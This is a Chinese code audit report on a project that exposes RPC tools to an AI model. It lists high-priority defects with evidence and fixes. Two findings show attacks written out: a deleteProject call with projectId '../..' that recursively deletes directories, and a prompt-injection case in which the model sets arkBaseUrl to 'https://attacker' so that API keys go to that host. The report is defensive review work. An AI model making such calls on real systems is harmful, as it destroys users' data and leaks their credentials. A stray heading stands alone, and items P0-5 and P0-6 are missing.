## 一、总体结论

**这个项目的工程纪律高于同类个人项目一个档次，但护栏的"覆盖幻觉"正在累积成真实资损与数据丢失风险。**

三句话概括：

1. **强项真实存在**：零运行时依赖、双半区边界清晰、188 个 RPC 方法的契约有单一真源、付费护栏设计了双层、i18n 走 `T()` 纪律、35 个自检脚本约 3,840 个断言点。这些不是摆设。
2. **弱项是"自我验证的可信度"**：最关键的三条分层断言恒为真（`verify-arch.mjs`）、唯一的付费幂等回归不在默认 gate 里、最大的三个套件（460/426/282 项）落在基线统计之外。**门禁显示全绿，但不能证明它想证明的事。**
3. **最危险的缺陷集中在"出错时静默"这条路径上**：地图编辑落盘失败无提示、坏档被空画布顶替、付费重试绕过幂等、删除类方法不校验 id。四类问题共同的形态是——**界面看着完全正常，损失在后台发生**。

## 二、P0 清单（7 条）

### P0-1 付费幂等在"失败重试"路径上失效 · 已复核

**证据链**
- `src/client/shell/apply.ts:100`：`callPaid()` 只补 `confirm: true`，**不传 `requestId`**。
- `src/client/platform/api.ts:118`：`preparePaidPayload()` 在 `requestId` 缺失时调用 `newRequestId()` —— 即**每次点击都生成新 id**。
- `src/receipts.ts:215-216`：`key = digest(method|requestId|slot|fingerprint)`，`requestId` 参与键计算；`:241` 的「指纹兜底」只在 `requestId === undefined` 时生效。
- 结论：同一个用户意图、同一份入参，重试时因 `requestId` 不同而得到不同的 receipt 键 → `existing === undefined` → 远端被再次提交。**双层护栏在这条路径上等于不存在。**
- 加重项：`scripts/verify-jobs.mjs`（唯一断言 `PaidDuplicateError` 的脚本）**不在** `gate.mjs` 的 `CORE_SCRIPTS` 里，只有 `--full` 才跑。

**触发场景**：生成请求超时 / 网络中断 → 用户点"重试" → 若上一次实际已被远端受理（状态 uncertain），本次再扣一次。

**修复方向**：`callPaid` 与 `runImageJob` 等多笔入口，以「一次用户意图」为粒度生成并复用 `requestId`；`runImageJob` 一次 N 张要用 `slot: item-N` 区分（否则第 2 张起会撞同一 receipt key，见 P2-7）。`verify-jobs.mjs` 并入 `CORE_SCRIPTS`。

### P0-2 删除类 RPC 不校验 id，可越界删除任意目录 · 已复核

**证据链**
- `src/wire.ts:40`：`projectIdSchema = z.object({ projectId: z.string() })` —— 无任何格式约束；`:1219` 的 `deleteProject` 直接使用它。
- `src/store.ts:329`：`projectDir(id) = join(projectsRoot(), id)` —— `join` 会归一化 `..`。
- `src/store.ts:527`：`deleteProject()` = `rm(projectDir(id), { recursive: true, force: true })`。
- 对照：`src/assets.ts:30` 有 `PROJECT_ID_PATTERN = /^p[a-z0-9]{4,40}$/`，但**只用于静态资源路由**，未用于写/删路径。

**触发场景**：工具面把 188 个方法暴露给模型（`src/tools.ts:978` 起）。`deleteProject({ projectId: "../.." })` 一次调用即可递归删除数据根目录之上。无需 `confirm`，不可恢复。

**修复方向**：把 id 格式校验收敛到 schema 层（`projectIdSchema` / `*JobIdSchema` 加正则），并在 `store.deleteProject` 等落盘函数内再断言一次（照 `src/musicgen.ts:306 assertJobId` 的形状）。

### P0-3 `saveConfig` 的网络地址族无白名单，凭据可被导向任意主机 · 已复核

**证据链**
- `src/tools.ts:1029`：工具面对 `saveConfig` 只拦 `hiddenModules` 一个字段，其余原样透传。
- `src/configpatch.ts:19`：`directKeys` 白名单里含 `customBaseUrl`、`toapisBaseUrl` 等，`arkBaseUrl` / `minimaxBaseUrl` / `musicBaseUrl` / `sfxBaseUrl` 同族字段均可写入；`src/config.ts:629` 仅做 `trim`，无 scheme/host 校验。

**触发场景**：提示注入让模型调一次 `saveConfig({ arkBaseUrl: "https://attacker" })`，下一次付费生图即把 `Authorization: Bearer <真实 Key>` 发往攻击者主机。五家 Key 均在此列。

**修复方向**：工具面拒绝所有 `*BaseUrl` / `*Model` / `customWorkflow` 类字段（与 `hiddenModules` 同级）；`normalizeConfig` 对 baseUrl 做 scheme + host 白名单（或至少要求 https + 显式用户确认）。

### P0-4 分层守卫是死代码，且当前已有 7 处真实违规 · 已复核

**证据链**
- `scripts/verify-arch.mjs:17`：`SRC = ROOT + "src"`；`:77`：`rel = path => path.slice(SRC.length + 1)` → 对 `src/client/features/map/index.ts` 返回 **`client/features/map/index.ts`**。
- `:99`：`const normalized = name.startsWith("features/") ? spec : undefined` —— 因前缀带 `client/`，**恒为 `undefined`**，随后 `continue`。→ `featureImports` 永远为空，`:105` 的 `platform` 反向依赖检查同样恒空。
- 实际违规：`src/client/features/{map,iso,image,music,rig,sequence,sfx}/index.ts:7` 全部 `import … from "../../<module>-module.js"`，**正是规则禁止的方向**（features 只许 import platform）。而 `npm run gate` 报「17 项检查全部通过」。

**为什么这是 P0**：这条规则的失效后果是 esbuild 内联后不报错、只在打开面板时 TDZ 白屏。守卫失效意味着"以后任何依赖写反都不会被发现"，而分层是这个项目最重要的架构约束。

**修复方向**：修 `rel()` 前缀（或把三处 `startsWith("features/")` 改为 `startsWith("client/features/")`），删除 `:99` 那个恒 `undefined` 的中间变量；对现存 7 处反向依赖建「只许减不许增」的棘轮白名单，避免修完断言立刻全红。

**证据链**

### P0-7 地图计划接口在大画布上返回 10–13 MB / 26 万 op · 待复核

**证据链**（子任务分析）：`src/mapgen.ts:2203` 的 `MAX_PLAN_CHUNKS = 4096` × 8×8 格 = 262,144 格，A2 每格约 4 op；`src/client/map-module.ts:668` 的 `planOps` 全量驻留并在每帧逐 op `drawImage`。512×512 地图缩到最远时单次响应约 10–13 MB JSON。

**影响**：一次拖拽停顿触发一次全量计划构建（宿主事件循环同步计算）+ 客户端 26 万 op 常驻内存 + 每帧 26 万次绘制。属于"规模一上来就崩"的形态。

**修复方向**：计划接口加「单次最大 op 数上限」，超限先回降采样或块摘要；客户端按屏幕像素剔除视口外 op；`buildPlan` 只算客户端缺的块（`have` 参数已存在，目前只用于过滤输出，见 P1 性能条目）。
